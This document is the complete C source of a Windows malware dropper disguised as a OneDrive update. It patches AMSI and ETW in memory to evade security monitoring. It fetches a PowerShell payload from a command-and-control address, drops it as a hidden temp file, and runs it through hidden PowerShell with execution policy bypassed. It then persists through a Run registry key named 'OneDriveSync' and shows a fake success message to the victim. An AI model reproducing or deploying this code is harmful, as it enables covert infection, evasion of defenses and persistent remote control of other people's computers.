#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define C2_IP "192.168.1.6"
#define C2_PORT 8000

bool bypass_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return true;
    LPVOID pAddr = (LPVOID)pAmsiScan;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

bool bypass_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    LPVOID pAddr = (LPVOID)pEtwEventWrite;
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    bypass_amsi();
    bypass_etw();
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;
    
    char url[256];
    snprintf(url, sizeof(url), "http://" C2_IP ":%d/static/payloads/bot_clear.ps1", C2_PORT);
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return 1; }
    
    BYTE buffer[4096];
    DWORD bytesRead;
    DWORD total = 0;
    BYTE* payload = (BYTE*)VirtualAlloc(NULL, 500000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        memcpy(payload + total, buffer, bytesRead);
        total += bytesRead;
    }
    payload[total] = 0;
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char psPath[MAX_PATH];
    snprintf(psPath, sizeof(psPath), "%s\\sysupdate.ps1", tempPath);
    
    HANDLE hFile = CreateFileA(psPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, payload, total, &written, NULL);
        CloseHandle(hFile);
    }
    
    char cmdline[1024];
    snprintf(cmdline, sizeof(cmdline),
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \"%s\"",
        psPath);
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveSync", 0, REG_SZ, (BYTE*)cmdline, strlen(cmdline) + 1);
        RegCloseKey(hKey);
    }
    
    MessageBoxA(NULL, "OneDrive se ha actualizado correctamente.", "OneDrive Update", MB_OK | MB_ICONINFORMATION);
    return 0;
}
